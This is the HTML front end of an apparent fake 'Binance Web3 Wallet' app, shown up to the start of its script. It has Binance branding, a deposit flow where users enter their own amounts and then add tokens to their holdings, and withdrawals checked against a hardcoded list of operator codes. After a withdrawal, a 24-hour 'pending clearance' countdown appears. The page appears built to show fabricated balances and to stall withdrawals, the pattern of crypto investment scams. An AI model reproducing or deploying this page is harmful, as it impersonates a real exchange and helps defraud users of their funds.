<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Binance Web3 Wallet Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <!-- TailwindCSS -->
  <script src="https://cdn.tailwindcss.com"></script>
  <!-- CoinGecko & TradingView -->
  <script src="https://s3.tradingview.com/tv.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/davidshimjs-qrcodejs@0.0.2/qrcode.min.js"></script>
  <link rel="icon" href="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" />
  <style>
    :root {
      --accent: #f0b90b;
      --accent2: #ffd43b;
      --danger: #f6465d;
      --success: #0ecb81;
      --dark: #07070b;
      --bg: #0d0e11;
      --card: #16181b;
      --surface: #17171d;
      --muted: #9aa0a6;
      --text: #e6e9eb;
    }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: 'Inter', ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, Arial;
      margin: 0;
      min-height: 100vh;
      -webkit-font-smoothing: antialiased;
    }
    .card { background-color: var(--card); border-radius: 12px; border: 1px solid #23262f; }
    .app-container { max-width: 520px; margin: 0 auto; min-height: 100vh; display: flex; flex-direction: column; }
    #footer-nav { position: fixed; bottom: 0; left: 0; right: 0; max-width: 520px; margin: 0 auto; background: var(--card); border-top: 1px solid #24242d; z-index: 50; }
    .footer-btn.active { color: var(--accent); }
    .footer-btn { color: #9aa0a6; transition: color .2s; }
    #modal-container, #loading-modal { transition: opacity .2s; }
    .modal-overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,.8); display: flex; align-items: center; justify-content: center; z-index: 100; }
    .modal-content { background: var(--card); border-radius: 12px; padding: 24px; width: 95%; max-width:400px; box-shadow: 0 8px 32px rgba(0,0,0,0.55); }
    #notification-banner { z-index:99; position: fixed; top: 0; left: 0; right: 0; max-width: 520px; margin:0 auto; background: linear-gradient(90deg,#fcd535,#f9e074,#fffbdc); color: #191a1b; padding: 14px 18px; border-radius: 0 0 16px 16px; box-shadow: 0 2px 12px rgba(0,0,0,0.13); display:none }
    .btn-primary { background: var(--accent); color: #181a20; font-weight: bold; border-radius: 8px; padding: 12px 0; width:100%; }
    .btn-primary:hover { background: var(--accent2); }
    .btn-secondary { background: var(--surface); color: var(--text); }
    .icon-btn { background: rgba(255,255,255,0.04); border-radius: 50%; padding: 10px; transition:background .2s;}
    .icon-btn:hover { background:rgba(255,255,255,0.08);}
    .input-field { background-color:var(--surface); border: 1px solid #20222b; color: var(--text); padding: 12px; border-radius: 8px; width: 100%; }
    .flex-center { display:flex;align-items:center;justify-content:center;}
    .hidden { display: none !important;}
    /* Custom scrollbars for chat/activity lists */
    .scrollbar::-webkit-scrollbar, #chat-box::-webkit-scrollbar { width:5px;}
    .scrollbar::-webkit-scrollbar-thumb, #chat-box::-webkit-scrollbar-thumb { background: #f0b90b66; border-radius: 3px;}
  </style>
</head>
<body>
<div class="app-container">
  <!-- GLOBAL HEADER -->
  <header id="header" class="sticky top-0 z-40 card p-4 border-b border-gray-800 flex items-center justify-between">
    <div class="flex gap-3 items-center">
      <img src="https://assets.coingecko.com/coins/images/825/large/binance-coin-logo.png" class="w-9 h-9 rounded-full" alt="Binance Logo" />
      <h1 class="text-xl font-bold text-accent">Web3 Wallet</h1>
    </div>
    <div class="flex items-center gap-2">
      <button onclick="openNotifications()" class="icon-btn" title="Notifications">
        <!-- Bell SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400 hover:text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 17h5l-1.405-1.405A2.03 2.03 0 0118 14.158V11a6.002 6.002 0 00-4-5.659V5a2 2 0 10-4 0v.34C7.67 6.165 6 8.388 6 11v3.159c0 .538-.214 1.055-.595 1.436L4 17h5m6 0v1a3 3 0 11-6 0v-1m6 0H9"/>
        </svg>
        <span id="notification-dot" class="absolute top-3 right-[125px] w-2 h-2 bg-red-500 rounded-full hidden"></span>
      </button>
      <button onclick="openSearch()" class="icon-btn" title="Search">
        <!-- Search SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400 hover:text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
        </svg>
      </button>
      <button onclick="showPage('supportPage')" class="icon-btn" title="Support Chat">
        <!-- Chat SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400 hover:text-yellow-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 4v-4z"/>
        </svg>
      </button>
      <button onclick="toggleMoreMenu()" class="icon-btn" title="More">
        <!-- Dots SVG -->
        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6 text-gray-400 hover:text-accent" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <circle cx="6" cy="12" r="2"/>
          <circle cx="12" cy="12" r="2"/>
          <circle cx="18" cy="12" r="2"/>
        </svg>
      </button>
      <button id="btnConnect" onclick="connectWallet()" class="ml-3 btn-primary text-sm font-semibold transition">Connect Wallet</button>
    </div>
    <!-- More menu dropdown -->
    <div id="moreMenu" class="absolute right-4 top-16 w-48 card shadow-xl rounded-lg z-50 hidden flex-col">
      <button onclick="showPage('accountDetailsPage')" class="block text-left px-4 py-3 text-sm hover:bg-gray-700">Account Details</button>
      <button onclick="showPage('settingsPage')" class="block text-left px-4 py-3 text-sm hover:bg-gray-700">Settings</button>
      <button onclick="disconnectWallet()" class="block text-left px-4 py-3 text-sm text-red-400 hover:bg-gray-700">Disconnect</button>
      <button onclick="closeAccount()" class="block text-left px-4 py-3 text-sm text-red-500 hover:bg-gray-700 rounded-b-lg">Close Account</button>
    </div>
  </header>

  <!-- Daily Market Pop Banner -->
  <div id="notification-banner" onclick="hideNotificationBanner()">
    <span id="banner-text" class="font-medium">Market update: Loading...</span>
    <button class="ml-4 p-1 rounded-full float-right" onclick="hideNotificationBanner()" style="background:none;border:none;outline:none;">
      <svg class="w-4 h-4 text-gray-700" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
      </svg>
    </button>
  </div>

  <!-- PAGE CONTAINER -->
  <div id="pageContainer" class="scrollbar overflow-y-auto pb-20">

    <!-- ----------------- HOMEPAGE DASHBOARD ----------------- -->
    <div id="home" class="page-content pt-2">
      <!-- 1. User Account ID Section -->
      <div class="card p-5 mb-3">
        <div class="flex justify-between items-center">
          <p class="text-sm text-muted">User Account ID</p>
          <p id="wallet-id-display" class="text-sm font-mono text-accent"></p>
        </div>
      </div>

      <!-- 2. Total Balance Section -->
      <div class="card p-5 mb-3">
        <p class="text-sm text-muted">Total Balance (USD)</p>
        <div class="flex items-end justify-between">
          <h2 id="total-balance" class="text-4xl font-bold mt-2">$0.00</h2>
          <span id="balance-percentage" class="text-sm font-semibold text-success ml-2"></span>
        </div>
        <div class="flex space-x-4 mt-6">
          <!-- Deposit Button -->
          <button onclick="openDepositPage()" class="flex-1 flex flex-col items-center p-3 rounded-xl bg-accent text-black hover:bg-yellow-400 transition font-semibold">
            <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" style="color: currentColor;">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-8l-4-4m0 0L8 8m4-4v12"/>
            </svg>
            <span class="mt-1 text-xs font-semibold">Deposit</span>
          </button>
          <!-- Withdraw Button -->
          <button onclick="openWithdraw()" class="flex-1 flex flex-col items-center p-3 rounded-xl bg-danger text-white hover:bg-danger/90 transition font-semibold">
            <svg class="h-6 w-6" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M20 12H4m12 4l-4-4m0 0l-4-4"/>
            </svg>
            <span class="mt-1 text-xs font-semibold">Withdraw</span>
          </button>
        </div>
      </div>

      <!-- 3. Holdings Section -->
      <div class="card p-5 mb-3">
        <h3 class="font-semibold text-lg mb-3">Holdings</h3>
        <div id="holdings-list">
          <p class="text-muted text-center py-4">Connect wallet to view holdings.</p>
        </div>
      </div>

      <!-- 4. Transactions & Activity Section -->
      <div class="card p-5 mb-3">
        <h3 class="font-semibold text-lg mb-3">Transactions & Activity</h3>
        <div id="activity-list">
          <p class="text-muted text-center py-2">No recent activities.</p>
        </div>
      </div>

      <!-- 5. Live Prices Performance Chart -->
      <div class="card p-5 mb-3">
        <h3 class="font-semibold text-lg mb-3">BTCUSDT Live Price</h3>
        <div id="tv-chart-container" style="height:400px;border-radius:10px;overflow:hidden;">
          <p class="text-center text-muted py-20">Loading chart...</p>
        </div>
      </div>

      <!-- 6. Hot Coins Section -->
      <div class="card p-5 mb-3">
        <h3 class="font-semibold text-lg mb-3">Hot Coins</h3>
        <div id="hot-coins-list" class="space-y-2">
          <p class="text-muted text-center py-4">Loading hot coins...</p>
        </div>
      </div>
    </div>

    <!-- ---------- MARKET PAGE ----------- -->
    <div id="marketPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Market Overview</h2>
      <div class="card p-4 mb-4">
        <h3 class="font-semibold text-lg mb-2 flex items-center">
          <svg class="h-5 w-5 mr-2 text-accent" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 20H5a2 2 0 01-2-2V6a2 2 0 012-2h10a2 2 0 012 2v10m-7-2l3-3m0 0l3 3m-3-3v8M8 12h.01M12 12h.01M16 12h.01" /></svg>
          Market News & Launch Pool
        </h3>
        <div id="market-news" class="space-y-2 text-sm text-gray-300">
          <p>Fetching market news...</p>
        </div>
      </div>
      <div class="card p-4 mb-4">
        <h3 class="font-semibold text-lg mb-2">Market Cap Performance</h3>
        <div id="tv-market-chart" style="height:400px;border-radius:8px;overflow:hidden;">
          <p class="text-center text-muted py-20">Loading chart...</p>
        </div>
      </div>
      <div class="card p-4 mb-4">
        <h3 class="font-semibold text-lg mb-2 flex items-center">
          <svg class="h-5 w-5 mr-2 text-success" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c1.657 0 3 .895 3 2s-1.343 2-3 2-3-.895-3-2 1.343-2 3-2zM9 16h6v-1a3 3 0 00-3-3h0a3 3 0 00-3 3v1z" /></svg>
          Top Coins List
        </h3>
        <div id="top-coins-list" class="divide-y divide-gray-800">
          <p class="text-muted text-center py-4">Fetching top coins...</p>
        </div>
      </div>
    </div>

    <!-- ---------- TRADE PAGE ----------- -->
    <div id="tradePage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-2">Spot Trading</h2>
      <div class="flex justify-between items-center mb-4 p-3 card">
        <div class="flex items-center gap-2">
          <span id="trade-pair-display" class="text-xl font-bold">BTC/USDT</span>
          <button onclick="changePairSelector()" class="icon-btn">
            <svg class="h-4 w-4 text-gray-300" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" /></svg>
          </button>
        </div>
        <span id="trade-price-display" class="text-lg font-mono text-success">Loading...</span>
      </div>
      <div id="tv-trade-chart" class="card mb-4" style="height:400px;border-radius:12px;">
        <p class="text-center text-muted py-20">Loading chart...</p>
      </div>
      <div class="flex space-x-4">
        <div class="flex-1 card p-4 rounded-xl space-y-3 border-l-4 border-success">
          <h4 class="text-lg font-semibold text-success">BUY BTC</h4>
          <input type="number" placeholder="Amount (USDT)" class="input-field"/>
          <input type="number" placeholder="Price (Optional)" class="input-field"/>
          <div class="flex justify-between text-sm text-muted">
            <span>Available:</span>
            <span id="trade-available-balance">$0.00 USDT</span>
          </div>
          <button class="btn-primary">Buy</button>
        </div>
        <div class="flex-1 card p-4 rounded-xl space-y-3 border-l-4 border-danger">
          <h4 class="text-lg font-semibold text-danger">SELL BTC</h4>
          <input type="number" placeholder="Amount (BTC)" class="input-field"/>
          <input type="number" placeholder="Price (Optional)" class="input-field"/>
          <div class="flex justify-between text-sm text-muted">
            <span>Available:</span>
            <span>0.00 BTC</span>
          </div>
          <button class="btn-primary bg-danger text-white">Sell</button>
        </div>
      </div>
    </div>

    <!-- -------- ACCOUNT PAGE ---------- -->
    <div id="accountPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Account</h2>
      <div id="account-details-card" class="card p-4 mb-4">
        <div id="account-status">
          <p class="text-lg font-semibold mb-2">Wallet Status: <span class="text-danger">Disconnected</span></p>
          <button onclick="connectWallet()" class="btn-primary">Connect Wallet</button>
        </div>
        <div id="account-info" class="hidden">
          <div class="mb-3"><p class="text-sm text-muted">User Account ID</p><p id="acc-user-id" class="text-lg font-mono"></p></div>
          <div class="mb-3"><p class="text-sm text-muted">Connected Wallet</p><p id="acc-wallet-addr" class="text-lg font-mono text-gray-300"></p></div>
          <div class="mb-3"><p class="text-sm text-muted">Deposit Balance</p><p id="acc-total-balance" class="text-lg font-bold text-accent"></p></div>
          <button onclick="showPage('accountDetailsPage')" class="btn-secondary mb-3">Account Details Panel</button>
          <button onclick="disconnectWallet()" class="btn-primary bg-danger text-white">Disconnect Wallet</button>
        </div>
      </div>
      <div class="card p-4 mb-4">
        <h3 class="font-semibold text-lg mb-3">Transactions & Activity</h3>
        <div id="account-activity-list" class="text-sm space-y-2"></div>
      </div>
    </div>

    <!-- ------ SUPPORT CHAT (Gemini AI) ------- -->
    <div id="supportPage" class="page-content pt-2 hidden" style="min-height:550px;">
      <h2 class="text-2xl font-bold mb-4">Support Chat (Gemini AI)</h2>
      <div id="chat-box" class="card p-4 h-96 overflow-y-scroll mb-4 space-y-4">
        <div class="flex justify-start">
          <div class="bg-gray-700 p-3 rounded-2xl rounded-bl-none max-w-[80%] text-sm">
            Welcome! I'm your Web3 Assistant. How can I help you with your wallet or market data today?
          </div>
        </div>
      </div>
      <div class="flex space-x-2">
        <input id="chat-input" type="text" placeholder="Type your message..." class="input-field flex-1" onkeydown="if(event.key === 'Enter') sendChatMessage()" />
        <button onclick="sendChatMessage()" class="bg-accent p-3 rounded-lg font-semibold">
          <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 20 20" fill="currentColor"><path d="M10.894 2.553a1 1 0 00-1.788 0l-7 14a1 1 0 00.183.323l.164.225h.001c.146.166.363.262.584.262h14c.22 0 .438-.096.584-.262l.164-.225a1 1 0 00.183-.323l-7-14z" /></svg>
        </button>
      </div>
    </div>

    <!-- ------ NOTIFICATION PAGE ------- -->
    <div id="notificationPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Notifications</h2>
      <div class="card p-4 mb-4 flex justify-between items-center">
        <span class="font-semibold">Receive Daily Market Updates</span>
        <label class="switch relative inline-block w-12 h-6">
          <input type="checkbox" id="notification-toggle" onchange="toggleNotifications()" checked>
          <span class="slider round absolute cursor-pointer top-0 left-0 right-0 bottom-0 bg-gray-600 transition duration-300 rounded-full before:absolute before:content-[''] before:h-5 before:w-5 before:left-0.5 before:bottom-0.5 before:bg-white before:rounded-full before:transition before:duration-300"></span>
        </label>
      </div>
      <div id="notification-list" class="space-y-3">
        <p class="text-muted text-center py-4">Loading latest notifications...</p>
      </div>
    </div>

    <!-- ------ SEARCH PAGE ------- -->
    <div id="searchPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Search</h2>
      <input id="search-input" type="text" placeholder="Search coins, markets, news..." class="input-field text-lg mb-4" oninput="liveSearch()" />
      <div id="search-results" class="space-y-3">
        <p class="text-muted text-center py-4">Start typing to see results...</p>
      </div>
    </div>

    <!-- ------ ACCOUNT DETAILS PAGE ------- -->
    <div id="accountDetailsPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Account Details</h2>
      <div class="card p-4 mb-4 space-y-4">
        <div><p class="text-sm text-muted">User Account ID</p><p id="det-user-id" class="text-lg font-mono"></p></div>
        <div><p class="text-sm text-muted">Connected Address</p><p id="det-wallet-addr" class="text-lg font-mono text-gray-300"></p></div>
        <div><p class="text-sm text-muted">Wallet Balance</p><p id="det-total-balance" class="text-lg font-bold text-accent"></p></div>
      </div>
      <button onclick="showPage('googleAuthPage')" class="btn-primary bg-danger text-white">Secure Account (Google Authentication)</button>
      <button onclick="showPage('accountPage')" class="btn-secondary mt-3">← Back to Account</button>
    </div>

    <!-- ------ GOOGLE AUTH PAGE ------- -->
    <div id="googleAuthPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-4">Google Authentication Verification</h2>
      <div class="card p-4 mb-4 space-y-4 text-center">
        <p class="text-sm text-muted">Scan this QR code with your Google Authenticator app.</p>
        <div class="flex justify-center"><div id="ga-qrcode" class="p-4 bg-white rounded-lg"></div></div>
        <p class="text-sm text-muted">Or manually enter the Secret Key:</p>
        <p id="ga-secret-key" class="text-lg font-mono break-all font-semibold bg-gray-900 p-2 rounded-lg">A4B8 C5D2 E7F1 H9G3</p>
      </div>
      <div class="card p-4 mb-4 space-y-3">
        <p class="text-sm text-muted">Enter Google Authenticator 6-digit code</p>
        <input id="ga-code-input" type="text" placeholder="------" maxlength="6" class="input-field text-center text-3xl tracking-widest" />
        <p id="ga-error" class="text-danger text-sm hidden">Invalid code. Please try again.</p>
        <button onclick="verifyGoogleAuthCode()" class="btn-primary">Verify Code</button>
      </div>
      <button onclick="showPage('accountDetailsPage')" class="btn-secondary mt-3">← Back</button>
    </div>

    <!-- ------ DEPOSIT PAGES ------- -->
    <!-- Coin selection page -->
    <div id="depositCoinSelectPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Deposit Asset</h2>
      <input id="depositSearch" type="text" placeholder="Search coin (e.g., BTC, ETH)" class="input-field text-lg mb-4" />
      <div id="depositCoinList" class="space-y-3 h-96 overflow-y-auto"></div>
      <button onclick="showPage('home')" class="btn-secondary mt-3">← Back</button>
    </div>
    <!-- Network selection page -->
    <div id="depositNetworkPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Select Deposit Network</h2>
      <p class="text-sm text-muted mb-2">Selected Coin: <span id="depositCoinName" class="font-semibold text-accent"></span></p>
      <div id="networkSelectionList" class="space-y-3"></div>
      <button onclick="showPage('depositCoinSelectPage')" class="btn-secondary mt-3">← Back to Coin Selection</button>
    </div>
    <!-- Deposit address page -->
    <div id="depositAddressPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-2">Deposit Address</h2>
      <p class="text-sm text-muted mb-2">Network: <span id="depositNetworkHeader" class="font-semibold text-accent"></span></p>
      <div class="card p-6 mb-4 text-center space-y-4">
        <div id="qrcode" class="flex justify-center"></div>
        <p id="depositAddressDisplay" class="text-base font-mono break-all font-semibold bg-gray-900 p-3 rounded-lg"></p>
        <button onclick="copyDepositAddress()" class="btn-secondary">Copy Address</button>
      </div>
      <div class="card p-4 mb-4 space-y-3">
        <p class="text-sm text-muted">Enter Deposit Amount</p>
        <div class="flex items-center space-x-2">
          <input id="depositAmountInput" type="number" placeholder="0.00" class="input-field text-lg flex-1" />
          <span class="text-lg font-semibold text-gray-300" id="depositAmountSymbol">USDT</span>
        </div>
      </div>
      <button onclick="showDepositConfirmationPage()" class="btn-primary">Confirm Deposit Amount</button>
      <button onclick="showPage('depositNetworkPage')" class="btn-secondary mt-3">← Back to Network</button>
    </div>
    <!-- Deposit confirmation page -->
    <div id="depositConfirmPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Confirm Deposit</h2>
      <div class="card p-4 mb-4 space-y-3">
        <p class="text-sm text-muted">Amount to Confirm:</p>
        <p id="depositConfirmAmount" class="text-3xl font-bold text-accent">$0.00</p>
        <div class="divider"></div>
        <p class="text-sm text-muted">Enter 6-digit verification code:</p>
        <input id="depositVerificationCode" type="text" placeholder="------" maxlength="6" class="input-field text-center text-3xl tracking-widest" />
        <p id="depositCodeError" class="text-danger text-sm hidden">Error message</p>
      </div>
      <button onclick="handleDepositConfirmation()" class="btn-primary bg-success">Process Deposit</button>
      <button onclick="showPage('depositAddressPage')" class="btn-secondary mt-3">← Back</button>
    </div>
    <!-- Deposit Success Modal Add Token -->
    <div id="deposit-success-modal" class="modal-overlay hidden">
      <div class="modal-content space-y-4">
        <h3 class="text-xl font-bold">Deposit Successful</h3>
        <p id="deposit-success-body" class="text-gray-300"></p>
        <button onclick="addDepositTokenToHoldings()" class="btn-primary" id="add-token-btn">Add Token</button>
        <button onclick="hideModal('deposit-success-modal')" class="btn-secondary">Cancel</button>
      </div>
    </div>

    <!-- ------ WITHDRAWAL FLOW PAGES ------- -->
    <!-- Withdraw Selection -->
    <div id="withdrawalSelector" class="modal-overlay hidden items-end">
      <div class="modal-content w-full max-w-[520px] p-4 space-y-4">
        <h2 class="text-xl font-bold mb-2">Withdrawal Options</h2>
        <button onclick="showWithdrawalDetails('on-chain')" class="btn-secondary">On-Chain Transfer</button>
        <button onclick="showWithdrawalDetails('account-id')" class="btn-secondary">User Account ID</button>
        <button onclick="hideModal('withdrawalSelector')" class="btn-secondary">Cancel</button>
      </div>
    </div>
    <!-- Withdraw Details Page -->
    <div id="withdrawDetailsPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Withdraw USDT (On-Chain)</h2>
      <div class="card p-5 mb-4">
        <p class="text-sm text-muted mb-1">Enter Withdrawal Address</p>
        <div class="flex items-center gap-2">
          <input id="withdraw-address-input" type="text" placeholder="0x..." class="input-field flex-1" />
          <button onclick="fillConnectedWalletAddress()" class="btn-secondary">Fill from connected wallet</button>
        </div>
      </div>
      <div class="card p-5 mb-4">
        <p class="text-sm text-muted mb-1">Select Network</p>
        <button onclick="toggleNetworkSelection()" id="networkSelectBtn" class="input-field flex items-center justify-between">
          <span id="selectedNetworkDisplay">Select Network</span>
          <svg class="w-4 h-4 text-muted" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"/></svg>
        </button>
        <div id="networkSelectionDropdown" class="card absolute w-full max-w-[420px] left-0 mt-2 z-50 hidden">
          <button onclick="selectWithdrawalNetwork('ETC_ETHEREUM','ETC Ethereum network')" class="btn-secondary">ETC Ethereum network</button>
          <button onclick="selectWithdrawalNetwork('BTC_BITCOIN','BTC Bitcoin network')" class="btn-secondary">BTC Bitcoin network</button>
          <button onclick="selectWithdrawalNetwork('BNB_BEP20','BNB Smart Chain BEP20 Network')" class="btn-secondary">BNB Smart Chain BEP20 Network</button>
          <button onclick="selectWithdrawalNetwork('TRON_TRC20','Tron TRC 20 network')" class="btn-secondary">Tron TRC 20 network</button>
        </div>
      </div>
      <div class="card p-5 mb-4">
        <p class="text-sm text-muted mb-1">Enter Withdrawal Amount (USDT)</p>
        <div class="flex items-center gap-2">
          <input id="withdraw-amount-input" type="number" placeholder="0.00" class="input-field text-lg flex-1" />
          <button onclick="setMaxWithdrawAmount()" class="btn-secondary">Max</button>
        </div>
        <div class="flex justify-between text-sm text-muted pt-2">
          <span>Gas Fee:</span>
          <span>0.034 BNB</span>
        </div>
      </div>
      <button onclick="showWithdrawalConfirmation()" class="btn-primary bg-danger text-white mb-2">Withdraw</button>
      <button onclick="showPage('home')" class="btn-secondary mt-2">← Back</button>
    </div>
    <!-- Withdraw Confirmation Page -->
    <div id="withdrawConfirmPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-3">Withdrawal Confirmation</h2>
      <div class="card p-5 space-y-3">
        <div>
          <p class="text-sm text-muted">Address: <span id="conf-addr" class="font-mono break-all text-gray-300"></span></p>
          <p class="text-sm text-muted">Network: <span id="conf-net" class="font-mono text-gray-300"></span></p>
          <p class="text-sm text-muted">Amount: <span id="conf-amt" class="font-bold text-accent"></span></p>
        </div>
        <div class="divider"></div>
        <p class="text-sm text-muted">Enter validation code (6-digit):</p>
        <input id="withdraw-validation-code" type="text" placeholder="------" maxlength="6" class="input-field text-center text-3xl tracking-widest" />
        <p id="withdraw-error" class="text-danger text-sm hidden">Error message</p>
      </div>
      <button onclick="submitWithdrawalConfirmation()" class="btn-primary bg-success">Submit</button>
      <button onclick="showPage('withdrawDetailsPage')" class="btn-secondary mt-3">← Back</button>
    </div>
    <!-- Withdraw Processing Page -->
    <div id="withdrawalProcessingPage" class="page-content pt-2 hidden">
      <h2 class="text-2xl font-bold mb-2 flex items-center text-yellow-500">
        <svg class="w-6 h-6 mr-2 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" /></svg>
        Withdrawal Processing
      </h2>
      <div class="card p-4 mb-4 space-y-3">
        <p class="text-sm text-muted">Your withdrawal has been initiated and is now pending clearance.</p>
        <div class="divider"></div>
        <p class="text-sm text-muted">Withdrawal Address: <span id="proc-addr" class="font-mono break-all text-gray-300"></span></p>
        <p class="text-sm text-muted">Network: <span id="proc-net" class="font-mono text-gray-300"></span></p>
        <p class="text-sm text-muted">Amount: <span id="proc-amt" class="font-bold text-accent"></span></p>
        <div class="divider"></div>
        <p class="text-sm text-muted">Estimated remaining time for final clearance:</p>
        <p id="proc-countdown" class="text-3xl font-bold text-center text-yellow-500">24:00:00</p>
      </div>
      <button onclick="showPage('home')" class="btn-primary bg-accent">View Withdrawal Details (Activity Section)</button>
    </div>

    <!-- ------- MODALS & LOADING ------- -->
    <div id="loading-modal" class="modal-overlay hidden">
      <div class="modal-content text-center">
        <svg class="animate-spin h-8 w-8 text-accent mx-auto" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 4v5h.582m15.836 3.104A9.914 9.914 0 0012 2C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 3l-4 4m0-4l4 4" /></svg>
        <p id="loading-text" class="mt-3 text-lg font-semibold">Loading...</p>
      </div>
    </div>
    <div id="modal-container" class="modal-overlay hidden">
      <div class="modal-content space-y-4">
        <h3 id="modal-title" class="text-xl font-bold">Title</h3>
        <p id="modal-body" class="text-gray-300"></p>
        <div class="flex justify-end gap-2">
          <button onclick="hideModal('modal-container')" class="btn-secondary">OK</button>
        </div>
      </div>
    </div>
  </div>

  <!-- FOOTER NAVIGATION BUTTONS -->
  <nav id="footer-nav" class="flex justify-around p-2 card">
    <button onclick="showPage('home')" class="footer-btn flex flex-col items-center p-2 active" data-page="home">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 24 24" fill="currentColor"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8h5z"/></svg><span class="mt-1">Home</span>
    </button>
    <button onclick="showPage('marketPage')" class="footer-btn flex flex-col items-center p-2" data-page="marketPage">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" viewBox="0 0 24 24" fill="currentColor"><circle cx="12" cy="12" r="10"/><rect x="6" y="16" width="2" height="2"/><rect x="16" y="16" width="2" height="2"/><rect x="6" y="6" width="2" height="2"/><rect x="16" y="6" width="2" height="2"/><rect x="10" y="10" width="4" height="4"/></svg><span class="mt-1">Market</span>
    </button>
    <button onclick="showPage('tradePage')" class="footer-btn flex flex-col items-center p-2" data-page="tradePage">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24"><path d="M16 8h2l-3 4-3-4h2V4h2v4zM8 16H6l3-4 3 4H8v4H6v-4zM2 12c0-5.52 4.48-10 10-10s10 4.48 10 10-4.48 10-10 10S2 17.52 2 12z"/></svg><span class="mt-1">Trade</span>
    </button>
    <button onclick="showPage('accountPage')" class="footer-btn flex flex-col items-center p-2" data-page="accountPage">
      <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M6 16c0-2.12 3.58-4 6-4s6 1.88 6 4v4H6z"/></svg><span class="mt-1">Account</span>
    </button>
  </nav>
</div>
    
    <script>
        // =======================================================
        // 1. GLOBAL CONSTANTS & STATE MANAGEMENT
        // =======================================================
        const APP_STATE_KEY = 'binanceWeb3AppState';
        const COINGECKO_API = 'https://api.coingecko.com/api/v3';
        const GEMINI_API_URL = 'https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key='; // Key intentionally left empty
        const IMAGE_GEN_API_URL = 'https://generativelanguage.googleapis.com/v1beta/models/imagen-3.0-generate-002:predict?key=';
        const IMAGE_MODEL = 'imagen-3.0-generate-002';
        const VALID_WITHDRAW_CODES = ["483t21", "175064", "90h718", "63h285", "217509", "856430", "49h127", "731694", "56h8k3", "30jy17", "941g56", "12s374", "6h5b20", "203519", "48h960", "819hh2", "356h01", "740h28"];

